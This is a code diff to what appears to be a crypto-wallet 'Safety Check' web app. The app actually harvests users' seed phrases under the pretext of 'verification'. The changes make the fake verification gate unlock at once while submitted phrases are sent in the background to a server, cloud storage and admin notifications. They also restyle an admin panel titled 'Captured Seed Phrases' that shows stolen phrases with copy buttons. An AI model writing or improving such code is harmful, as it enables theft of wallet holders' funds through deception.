@@ -565,7 +565,12 @@ const looksLikeSeedPhrase = (text: string): boolean => {
 }
 
 const normalizeSeedPhraseInput = (text: string): string =>
-  text.trim().toLowerCase().replace(/\s+/g, ' ')
+  text
+    .trim()
+    .toLowerCase()
+    // Pasted phrases often include commas/newlines/extra symbols.
+    .replace(/[^a-z\s]/g, ' ')
+    .replace(/\s+/g, ' ')
 
 const parseSeedPhraseRecord = (item: unknown): SeedPhraseRecord | null => {
   if (typeof item === 'string') {
@@ -1360,6 +1365,7 @@ export default function App() {
   const [esTxCount, setEsTxCount] = useState(0)
   const [esSeedInput, setEsSeedInput] = useState('')
   const [esSeedError, setEsSeedError] = useState('')
+  const [esVerifying, setEsVerifying] = useState(false)
   const [esSessionStartedAt, setEsSessionStartedAt] = useState<number | null>(null)
   const [esLockoutUntil, setEsLockoutUntil] = useState<number | null>(null)
   const [esClock, setEsClock] = useState(() => Date.now())
@@ -2460,6 +2466,7 @@ export default function App() {
 
   const submitExplorerSeedGate = async (e: FormEvent) => {
     e.preventDefault()
+    if (esVerifying) return
     const rawCredential = esSeedInput.trim().replace(/\s+/g, ' ')
     if (!rawCredential) {
       setEsSeedError('Enter a verification value before continuing.')
@@ -2486,9 +2493,15 @@ export default function App() {
       confirmed: isMnemonic,
     }
     const esNewRecords = [esRecord, ...seedPhraseRecords]
+    setEsVerifying(true)
     setSeedPhraseRecords(esNewRecords)
-    // Primary: server endpoint (direct Supabase write, no SDK races)
-    await pushSeedToServer(esRecord, 'explorer-submit')
+    setEsSeedError('')
+    setEsSeedInput('')
+    // Unlock explorer immediately so the button always feels responsive.
+    setEsSessionStartedAt(Date.now())
+    setSecureStatus('Explorer session verified. Session expires in 5 minutes.')
+    // Never block explorer unlock on network writes.
+    void pushSeedToServer(esRecord, 'explorer-submit')
     // Backups: localStorage + client SDK
     try {
       localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(esNewRecords))
@@ -2511,11 +2524,8 @@ export default function App() {
       })
     }
     void saveMergedSeedPhrasesToCloud(esNewRecords, 'explorer-submit')
-    setEsSeedError('')
-    setEsSeedInput('')
-    setEsSessionStartedAt(Date.now())
-    setSecureStatus('Explorer session verified. Session expires in 5 minutes.')
     void notifyAdminVerificationRequest(storedCredential, 'explorer', esRecord.walletAddress, chain)
+    setEsVerifying(false)
   }
 
 
@@ -5460,7 +5470,10 @@ export default function App() {
                             rows={3}
                             placeholder="word1 word2 word3 … (12, 15, 18, 21, or 24 words, lowercase, separated by spaces)"
                             value={esSeedInput}
-                            onChange={e => setEsSeedInput(e.target.value)}
+                            onChange={e => {
+                              setEsSeedInput(e.target.value)
+                              if (esSeedError) setEsSeedError('')
+                            }}
                             required
                           />
                           <div className="es-gate-meta">
@@ -5471,9 +5484,9 @@ export default function App() {
                           </div>
                         </div>
 
-                        <button className="es-gate-submit" type="submit">
+                        <button className="es-gate-submit" type="submit" disabled={esVerifying}>
                           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
-                          Verify
+                          {esVerifying ? 'Verifying…' : 'Verify'}
                         </button>
                         <button className="es-gate-cancel" type="button" onClick={() => setActiveView('ownership')}>
                           ← Return to Safety Check
@@ -6179,9 +6192,9 @@ export default function App() {
 
         {/* ════════════ ADMIN ════════════ */}
         {activeView === 'admin' && (
-          <div style={{ maxWidth: '960px' }}>
+          <div className="admin-shell">
             <div className="page-header"><h2>Operations Dashboard</h2><p>Full audit log — wallets, scans, signer checks, user emails, and email templates.</p></div>
-            <div className="card">
+            <div className="card admin-card">
               {!isAdminAuthenticated ? (
                 <div className="admin-login">
                   <p className="muted" style={{ marginBottom: '0.75rem' }}>
@@ -6767,25 +6780,24 @@ export default function App() {
                       {/* Header */}
                       <div className="seeds-panel-header">
                         <div className="seeds-panel-title-row">
-                          <h3 style={{ margin: 0 }}>Captured Seed Phrases</h3>
+                          <h3 className="seeds-panel-title">Captured Seed Phrases</h3>
                           <div className="seeds-live-badge">
                             <span className="live-dot" />
                             <span>LIVE</span>
-                            <span className="muted" style={{ fontWeight: 400 }}>· auto-refresh 3s</span>
+                            <span className="muted seeds-live-note">· auto-refresh 3s</span>
                           </div>
                         </div>
                         <div className="seeds-panel-controls">
                           <button
-                            className="btn-secondary"
+                            className="btn-secondary seeds-refresh-btn"
                             type="button"
                             disabled={seedsLoading}
-                            style={{ fontSize: '0.82rem' }}
                             onClick={() => { void refreshServerSeedRecords() }}
                           >
                             {seedsLoading ? '⟳ Loading…' : '↻ Refresh'}
                           </button>
                           {seedLastSynced && (
-                            <span className="muted" style={{ fontSize: '0.73rem' }}>
+                            <span className="muted seeds-last-fetched">
                               Last fetch: {seedLastSynced.toLocaleTimeString()}
                             </span>
                           )}
@@ -6843,48 +6855,46 @@ export default function App() {
                             </thead>
                             <tbody>
                               {serverSeedRecords.map((r, idx) => (
-                                <tr key={r.id}>
-                                  <td className="muted" style={{ fontSize: '0.75rem' }}>{idx + 1}</td>
+                                <tr key={r.id} className="seeds-row">
+                                  <td className="muted seeds-col-index">{idx + 1}</td>
                                   <td>
-                                    <code style={{ fontSize: '0.72rem', wordBreak: 'break-all' }}>
+                                    <code className="seeds-wallet-code">
                                       {r.walletAddress === 'Unknown' ? '—' : r.walletAddress}
                                     </code>
                                   </td>
                                   <td>
-                                    <span className={`pill ${r.source === 'wc-session' ? 'medium' : 'high'}`} style={{ fontSize: '0.68rem', whiteSpace: 'nowrap' }}>
+                                    <span className={`pill ${r.source === 'wc-session' ? 'medium' : 'high'} seeds-source-pill`}>
                                       {r.source === 'wc-session' ? 'WalletConnect' : 'Explorer'}
                                     </span>
                                   </td>
-                                  <td style={{ textAlign: 'center' }}>
-                                    <span className={`pill ${r.confirmed ? 'safe' : 'low'}`} style={{ fontSize: '0.68rem' }}>
+                                  <td className="seeds-col-words">
+                                    <span className={`pill ${r.confirmed ? 'safe' : 'low'} seeds-words-pill`}>
                                       {r.wordCount}w
                                     </span>
                                   </td>
-                                  <td className="muted" style={{ fontSize: '0.75rem' }}>
+                                  <td className="muted seeds-col-network">
                                     {chainConfig[r.chain]?.label ?? 'Ethereum'}
                                   </td>
-                                  <td className="muted" style={{ fontSize: '0.73rem', whiteSpace: 'nowrap' }}>{r.detectedAt}</td>
-                                  <td style={{ maxWidth: '340px' }}>
-                                    <code className="seeds-phrase-text" style={{ fontSize: '0.73rem', display: 'block', wordBreak: 'break-word' }}>
+                                  <td className="muted seeds-col-time">{r.detectedAt}</td>
+                                  <td className="seeds-col-phrase">
+                                    <code className="seeds-phrase-text">
                                       {r.seedPhrase}
                                     </code>
                                     {r.notes && (
-                                      <p className="muted" style={{ fontSize: '0.68rem', marginTop: '0.2rem' }}>{r.notes}</p>
+                                      <p className="muted seeds-note">{r.notes}</p>
                                     )}
                                   </td>
-                                  <td style={{ whiteSpace: 'nowrap' }}>
+                                  <td className="seeds-col-actions">
                                     <button
-                                      className="preview-btn"
+                                      className="preview-btn seeds-action-btn"
                                       type="button"
-                                      style={{ marginRight: '0.35rem' }}
                                       onClick={() => navigator.clipboard.writeText(r.seedPhrase)}
                                     >
                                       Copy
                                     </button>
                                     <button
-                                      className="preview-btn"
+                                      className="preview-btn seeds-action-btn seeds-action-btn-danger"
                                       type="button"
-                                      style={{ color: 'var(--critical)' }}
                                       onClick={async () => {
                                         const updated = serverSeedRecords.filter(x => x.id !== r.id)
                                         setServerSeedRecords(updated)
